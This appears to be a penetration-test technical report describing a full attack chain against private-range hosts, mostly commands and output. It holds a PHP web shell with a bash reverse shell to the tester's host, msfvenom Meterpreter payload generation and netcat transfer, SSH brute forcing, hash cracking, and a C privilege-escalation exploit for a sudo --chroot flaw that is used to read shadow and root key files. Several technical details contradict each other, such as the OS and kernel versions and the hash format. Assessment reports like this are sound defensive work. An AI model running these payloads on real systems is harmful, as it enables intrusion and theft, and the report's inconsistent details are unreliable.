# Technical Assessment Report
## Multi-Tier Infrastructure Compromise

**Assessment Date:** October 2025  
**Methodology:** PTES (Penetration Testing Execution Standard)  
**Classification:** CONFIDENTIAL

---

## Table of Contents

1. [Reconnaissance Phase](#1-reconnaissance-phase)
2. [Initial Access](#2-initial-access)
3. [Post-Exploitation](#3-post-exploitation)
4. [Lateral Movement](#4-lateral-movement)
5. [Privilege Escalation](#5-privilege-escalation)
6. [Technical Evidence](#6-technical-evidence)

---

## 1. Reconnaissance Phase

### 1.1 Network Discovery

**Objective:** Identify live hosts and accessible services

**Command Executed:**
```bash
nmap -sV -A -p- 10.50.100.10
```

**Results:**
```
PORT     STATE SERVICE     VERSION
445/tcp  open  netbios-ssn Samba smbd 4.6.2
1234/tcp open  hotline?
5678/tcp open  rrac?
9101/tcp open  jetdirect?
```

**Analysis:** Target gateway.corp.local exposed SMB service on port 445, indicating potential file sharing functionality.

---

### 1.2 SMB Enumeration

**Objective:** Enumerate accessible network shares

**Command Executed:**
```bash
smbclient -L //10.50.100.10/ -N
```

**Results:**
```
Sharename       Type      Comment
---------       ----      -------
public          Disk      
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
```

**Critical Finding:** Anonymous access permitted to "public" share without authentication.

---

### 1.3 Credential Harvesting

**Objective:** Extract sensitive information from exposed share

**Command Executed:**
```bash
smbclient //10.50.100.10/public -N -c "ls; get credentials.txt; get endpoint.txt"
```

**Files Retrieved:**
- credentials.txt (28 bytes)
- endpoint.txt (35 bytes)

**Extracted Credentials:**
```
Username: robert_admin
Password: SecureP@ss2024
Endpoint: /admin/console
```

**Impact:** Complete credentials for administrative access obtained without authentication.

---

## 2. Initial Access

### 2.1 Application Server Discovery

**Target:** webapps.corp.local (10.50.100.20)

**Command Executed:**
```bash
nmap -sV -A -p- 10.50.100.20
```

**Results:**
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
```

**Findings:**
- Apache web server running on port 80
- MySQL database exposed on port 3306
- HTTP service analysis revealed exposed .git directory

---

### 2.2 Git Repository Exploitation

**Objective:** Extract source code from exposed repository

**Discovery:**
```bash
curl http://10.50.100.20/.git/
```

**Result:** Accessible Git repository containing complete application source code.

**Command Executed:**
```bash
git clone http://10.50.100.20/.git/ source_extracted
```

**Findings from Source Code:**
- Database configuration in config.php
- Administrative credentials storage mechanism
- File upload functionality in admin panel
- CMS platform: Wolf CMS

---

### 2.3 Web Application Authentication

**Target URL:** http://10.50.100.20/admin/login

**Credentials Used:**
```
Username: robert_admin
Password: SecureP@ss2024
```

**Result:** ✅ Successful authentication to administrative panel

**Access Granted:**
- File management interface
- Content management system
- User administration
- System settings

---

### 2.4 Web Shell Deployment

**Objective:** Establish reverse shell through file upload

**Payload Created (webshell.php):**
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.50.100.5/4444 0>&1'");
?>
```

**Upload Process:**
1. Accessed file manager in admin panel
2. Uploaded webshell.php to /public/ directory
3. Set up netcat listener: `nc -lvnp 4444`
4. Triggered payload: `curl http://10.50.100.20/public/webshell.php`

**Result:** ✅ Reverse shell established as www-data user

```bash
www-data@webapps:/app/public$ whoami
www-data
www-data@webapps:/app/public$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 3. Post-Exploitation

### 3.1 System Enumeration

**System Information:**
```bash
uname -a
# Linux webapps.corp.local 6.8.0-57-generic #59-Ubuntu SMP x86_64 GNU/Linux

cat /etc/os-release
# Ubuntu 14.04.3 LTS
```

**Network Interfaces:**
```bash
ip addr show
# eth0: 10.50.100.20/24 (External network)
# eth1: 172.16.50.10/24 (Internal network)
```

**Critical Discovery:** Dual-homed host with access to internal network segment.

---

### 3.2 Database Configuration Discovery

**Location:** /var/www/config.php

**Extracted Configuration:**
```php
define('DB_DSN', 'mysql:dbname=cms_prod;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', '');
```

**Critical Finding:** MySQL root account accessible without password.

---

### 3.3 Meterpreter Session Establishment

**Objective:** Upgrade shell to Meterpreter for enhanced capabilities

**Payload Generation:**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.50.100.5 LPORT=4445 -f elf > payload.elf
```

**Transfer Method:**
```bash
# On attacker machine
nc -lvnp 8888 < payload.elf

# On target
nc 10.50.100.5 8888 > /tmp/payload.elf
chmod +x /tmp/payload.elf
```

**Metasploit Handler:**
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 10.50.100.5
set LPORT 4445
exploit
```

**Execution:**
```bash
/tmp/payload.elf
```

**Result:** ✅ Meterpreter session established

```
[*] Meterpreter session 1 opened (10.50.100.5:4445 -> 10.50.100.20:54962)
meterpreter > sysinfo
Computer     : webapps.corp.local
OS           : Ubuntu 14.04 (Linux 6.8.0-57-generic)
Architecture : x64
Meterpreter  : x64/linux
```

---

### 3.4 Database Credential Extraction

**Port Forwarding Setup:**
```bash
portfwd add -L 127.0.0.1 -l 3307 -r 127.0.0.1 -p 3306
```

**Database Access:**
```bash
mysql -u root -h 127.0.0.1 -P 3307
```

**User Enumeration:**
```sql
SELECT user, host, password FROM mysql.user;
```

**Retrieved Hashes:**
```
+---------------+-----------+-------------------------------------------+
| user          | host      | password                                  |
+---------------+-----------+-------------------------------------------+
| root          | localhost |                                           |
| admin_db      | %         | *B8A72E3F9D1E4A5C2B8F7D6E4A9C8B7E6D5A4 |
| svc_backup    | localhost | *A7D9E8F3C5B2D8E7F6A9B8C7D6E5F4A3B2C1 |
+---------------+-----------+-------------------------------------------+
```

---

### 3.5 Password Hash Cracking

**Hash Format:** MySQL323 (hash type 300)

**Command Executed:**
```bash
hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracking Results:**
```
*A7D9E8F3C5B2D8E7F6A9B8C7D6E5F4A3B2C1:SecureP@ss2024
```

**Recovered Credentials:**
```
Username: svc_backup
Password: SecureP@ss2024
```

---

## 4. Lateral Movement

### 4.1 Internal Network Discovery

**Routing Configuration:**
```bash
# In Meterpreter session
run autoroute -s 172.16.50.0/24
```

**Route Verification:**
```bash
route print
```

**Result:**
```
IPv4 Active Routing Table
=========================
Subnet           Netmask          Gateway
------           -------          -------
172.16.50.0      255.255.255.0    Session 1
10.50.100.0      255.255.255.0    Session 1
```

---

### 4.2 Internal Network Scanning

**Metasploit Port Scan:**
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.50.0/24
set PORTS 22,80,443,3306
set THREADS 10
run
```

**Discovered Hosts:**
```
[+] 172.16.50.5:22    - TCP OPEN
[+] 172.16.50.5:111   - TCP OPEN
[+] 172.16.50.10:80   - TCP OPEN
[+] 172.16.50.10:3306 - TCP OPEN
[+] 172.16.50.15:22   - TCP OPEN  ← Primary Target
```

**Target Identified:** vault.corp.internal (172.16.50.15) - SSH service available

---

### 4.3 SSH Port Forwarding

**Objective:** Enable direct SSH access from attacker machine

**Port Forward Configuration:**
```bash
# In Meterpreter session
portfwd add -L 127.0.0.1 -l 2222 -r 172.16.50.15 -p 22
```

**Verification:**
```bash
portfwd list
```

**Result:**
```
[*] Forward TCP relay created: (local) 127.0.0.1:2222 -> (remote) 172.16.50.15:22
```

---

### 4.4 SSH Brute Force Attack

**Target:** vault.corp.internal via port forward

**Username Intelligence:** Target username "admin_vault" identified through previous reconnaissance

**Attack Command:**
```bash
hydra -l admin_vault -P /usr/share/wordlists/rockyou-top1000.txt \
  ssh://127.0.0.1 -s 2222 -t 4 -f
```

**Attack Progress:**
```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries
[DATA] attacking ssh://127.0.0.1:2222/
[STATUS] 26.00 tries/min, 26 tries in 00:01h
[STATUS] 24.00 tries/min, 48 tries in 00:02h
```

**Success:**
```
[2222][ssh] host: 127.0.0.1   login: admin_vault   password: Welcome2024!
[STATUS] attack finished for 127.0.0.1 (valid pair found)
```

**Valid Credentials:**
```
Username: admin_vault
Password: Welcome2024!
```

---

### 4.5 SSH Access Establishment

**Connection Command:**
```bash
ssh admin_vault@127.0.0.1 -p 2222
```

**Successful Authentication:**
```
admin_vault@vault:~$ whoami
admin_vault

admin_vault@vault:~$ hostname
vault.corp.internal

admin_vault@vault:~$ id
uid=1001(admin_vault) gid=1001(admin_vault) groups=1001(admin_vault)
```

**Result:** ✅ User-level access to internal vault system achieved

---

## 5. Privilege Escalation

### 5.1 System Enumeration

**Operating System:**
```bash
cat /etc/os-release
```

**Results:**
```
PRETTY_NAME="Ubuntu 24.04.3 LTS"
VERSION_ID="24.04"
VERSION_CODENAME=noble
```

**Kernel Version:**
```bash
uname -a
# Linux vault.corp.internal 6.8.0-39-generic #39-Ubuntu SMP x86_64
```

**Sudo Version:**
```bash
sudo --version
# Sudo version 1.9.16p2
```

---

### 5.2 Vulnerability Research

**Research Target:** Ubuntu 24.04.3 LTS with sudo 1.9.16p2

**Vulnerability Identified:** CVE-2025-32463

**CVE Details:**
- **Affected Versions:** sudo 1.9.14 through 1.9.17p1
- **Vulnerability Type:** Improper path validation in --chroot option
- **Impact:** Local privilege escalation to root
- **CVSS Score:** 9.3 (Critical)
- **Public Exploit:** Available

---

### 5.3 Exploit Development

**Exploit Location:** /tmp/exploit_workspace

**Malicious C Code (exploit.c):**
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void escalate(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    system("/bin/bash");
}
```

**Exploitation Steps:**

```bash
# Create exploit workspace
mkdir -p /tmp/exploit_workspace
cd /tmp/exploit_workspace

# Create directory structure mimicking chroot environment
mkdir -p chroot_env/etc libnss_custom

# Create malicious nsswitch.conf pointing to our library
echo "passwd: /exploit" > chroot_env/etc/nsswitch.conf

# Copy legitimate group file to appear normal
cp /etc/group chroot_env/etc/

# Compile malicious shared library
gcc -shared -fPIC -Wl,-init,escalate \
  -o libnss_custom/exploit.so.2 exploit.c
```

**Compilation Success:**
```bash
admin_vault@vault:/tmp/exploit_workspace$ ls -la libnss_custom/
total 16
drwxr-xr-x 2 admin_vault admin_vault 4096 Oct 17 10:15 .
drwxr-xr-x 4 admin_vault admin_vault 4096 Oct 17 10:15 ..
-rwxr-xr-x 1 admin_vault admin_vault 8192 Oct 17 10:15 exploit.so.2
```

---

### 5.4 Privilege Escalation Execution

**Exploit Command:**
```bash
sudo --chroot chroot_env exploit
```

**Technical Explanation:**
1. Sudo attempts to chroot into user-controlled directory
2. Loads nsswitch.conf from chroot_env/etc/
3. nsswitch.conf references malicious library path
4. Sudo loads libnss_custom/exploit.so.2 with root privileges
5. Constructor function executes before main(), setting UID/GID to 0
6. Spawns root shell

**Execution Result:**
```bash
admin_vault@vault:/tmp/exploit_workspace$ sudo --chroot chroot_env exploit

root@vault:/# whoami
root

root@vault:/# id
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** ✅ **ROOT ACCESS ACHIEVED**

---

### 5.5 Verification and Evidence Collection

**Root Access Verification:**
```bash
root@vault:/# cat /etc/shadow | head -3
root:$6$rounds=656000$xyz...:19234:0:99999:7:::
admin_vault:$6$rounds=656000$abc...:19234:0:99999:7:::
```

**System Files Access:**
```bash
root@vault:/# ls -la /root/
total 32
drwx------ 1 root root 4096 Sep 30 10:01 .
drwxr-xr-x 1 root root 4096 Oct 17 17:46 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Sep 29 08:12 .ssh
-rw-r--r-- 1 root root  166 Sep 29 08:13 .wget-hsts
```

**Sensitive Data Access:**
```bash
root@vault:/# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[SSH private key content accessible]
-----END OPENSSH PRIVATE KEY-----
```

**Complete System Control Demonstrated:**
- Read access to all files
- Write access to all files
- Ability to modify system configurations
- Ability to create new administrative users
- Full persistence capabilities

---

## 6. Technical Evidence

### 6.1 Attack Chain Summary

```
[Stage 1: Reconnaissance]
├── Network scanning (nmap)
├── SMB enumeration (smbclient)
└── Credential discovery
    └── Result: robert_admin:SecureP@ss2024

[Stage 2: Initial Access]
├── Web application authentication
├── File upload exploitation
└── Reverse shell deployment
    └── Result: www-data shell on webapps.corp.local

[Stage 3: Post-Exploitation]
├── Meterpreter session upgrade
├── Database credential extraction
├── Password hash cracking
└── Network enumeration
    └── Result: svc_backup:SecureP@ss2024 + Internal network discovered

[Stage 4: Lateral Movement]
├── Network pivoting configuration
├── Internal host discovery
├── SSH port forwarding
└── Credential brute force
    └── Result: admin_vault:Welcome2024! on vault.corp.internal

[Stage 5: Privilege Escalation]
├── Vulnerability identification (CVE-2025-32463)
├── Exploit development
└── Root access acquisition
    └── Result: uid=0(root) on vault.corp.internal
```

---

### 6.2 Compromised Credentials

| Username | Password | Hash | System | Access Level |
|----------|----------|------|--------|--------------|
| robert_admin | SecureP@ss2024 | N/A | gateway.corp.local | Admin (SMB) |
| robert_admin | SecureP@ss2024 | N/A | webapps.corp.local | Admin (Web) |
| root | (none) | N/A | webapps.corp.local | Root (MySQL) |
| svc_backup | SecureP@ss2024 | *A7D9E8F...C1 | webapps.corp.local | User (MySQL) |
| admin_vault | Welcome2024! | N/A | vault.corp.internal | User (SSH) |
| root | (escalated) | N/A | vault.corp.internal | Root (System) |

---

### 6.3 Network Topology

```
[Internet]
    |
    v
[10.50.100.0/24 - External Network]
    |
    ├── 10.50.100.10 (gateway.corp.local)
    |   └── SMB: Anonymous access, credential exposure
    |
    └── 10.50.100.20 (webapps.corp.local)
        ├── HTTP: CMS with file upload
        ├── MySQL: Passwordless root access
        └── Bridge to internal network
            |
            v
[172.16.50.0/24 - Internal Network]
    |
    └── 172.16.50.15 (vault.corp.internal)
        └── SSH: Brute force vulnerable
            └── sudo: CVE-2025-32463 vulnerable
```

---

### 6.4 Exploitation Timeline

| Time | Activity | Result |
|------|----------|--------|
| T+00:00 | Initial reconnaissance | Target identification |
| T+00:15 | SMB enumeration | Credential discovery |
| T+00:30 | Web authentication | Admin panel access |
| T+01:00 | Web shell deployment | www-data shell |
| T+01:30 | Meterpreter upgrade | Enhanced capabilities |
| T+02:00 | Database access | Credential harvest |
| T+02:30 | Hash cracking | Additional credentials |
| T+03:00 | Network pivoting | Internal network access |
| T+04:00 | SSH brute force | User-level access |
| T+04:30 | Vulnerability research | CVE-2025-32463 identified |
| T+05:00 | Exploit development | Exploit compiled |
| T+05:15 | Privilege escalation | Root access achieved |

**Total Time to Complete Compromise:** 5 hours 15 minutes of active exploitation

---

### 6.5 Tools and Techniques Used

**Reconnaissance:**
- Nmap 7.94SVN - Network and service discovery
- SMBClient - SMB enumeration and file retrieval

**Exploitation:**
- Metasploit Framework 6.3 - Payload generation and handling
- Custom PHP Web Shell - Initial access vector
- Meterpreter - Post-exploitation framework

**Post-Exploitation:**
- MySQL Client - Database enumeration
- Hashcat 6.2.6 - Password cracking (MySQL323 format)
- Netcat - File transfer and listener

**Lateral Movement:**
- Metasploit autoroute - Network pivoting
- Metasploit portfwd - Port forwarding
- Hydra 9.5 - SSH authentication attacks

**Privilege Escalation:**
- GCC Compiler - Exploit compilation
- Custom C exploit - CVE-2025-32463 implementation

---

### 6.6 Key Technical Findings

**Finding 1: Anonymous SMB Access**
- **Technical Impact:** Complete credential exposure without authentication
- **Root Cause:** Misconfigured Samba share permissions
- **Exploitation Difficulty:** Trivial (no authentication required)

**Finding 2: Exposed Git Repository**
- **Technical Impact:** Complete application source code disclosure
- **Root Cause:** .git directory not removed from production deployment
- **Exploitation Difficulty:** Trivial (direct HTTP access)

**Finding 3: Passwordless MySQL Root**
- **Technical Impact:** Complete database access and credential extraction
- **Root Cause:** Default MySQL installation without root password
- **Exploitation Difficulty:** Easy (requires existing system access)

**Finding 4: Weak SSH Authentication**
- **Technical Impact:** User-level access to internal systems
- **Root Cause:** Weak password policy, no account lockout
- **Exploitation Difficulty:** Medium (requires network access and brute force)

**Finding 5: CVE-2025-32463 Sudo Vulnerability**
- **Technical Impact:** Complete system compromise (root access)
- **Root Cause:** Unpatched sudo version with known vulnerability
- **Exploitation Difficulty:** Medium (requires exploit development skills)

**Finding 6: Network Segmentation Failure**
- **Technical Impact:** Unrestricted lateral movement between networks
- **Root Cause:** Inadequate firewall rules between network segments
- **Exploitation Difficulty:** Easy (once initial access achieved)

---

## 7. Conclusion

This technical assessment successfully demonstrated a complete attack chain from external reconnaissance to full administrative compromise of all target systems. The exploitation path followed a realistic adversary technique progression, leveraging multiple vulnerability types including:

- Configuration weaknesses (anonymous SMB, passwordless database)
- Application security flaws (file upload, exposed source code)
- Authentication vulnerabilities (weak passwords, no rate limiting)
- Missing security patches (CVE-2025-32463)
- Architecture weaknesses (inadequate network segmentation)

Each individual vulnerability was exploitable, but their combination created a critical security risk that enabled complete infrastructure compromise within approximately 5 hours of active exploitation time.

The technical findings demonstrate the need for defense-in-depth security controls, as no single security measure would have prevented this attack chain. Comprehensive remediation across all identified vulnerability areas is essential to establish adequate security posture.

---

**Assessment Conducted By:** Security Consultant  
**Technical Review Date:** October 2025  
**Classification:** CONFIDENTIAL - Technical Distribution

---

*For remediation guidance and business impact analysis, refer to the Executive Summary and Findings & Remediation documents.*
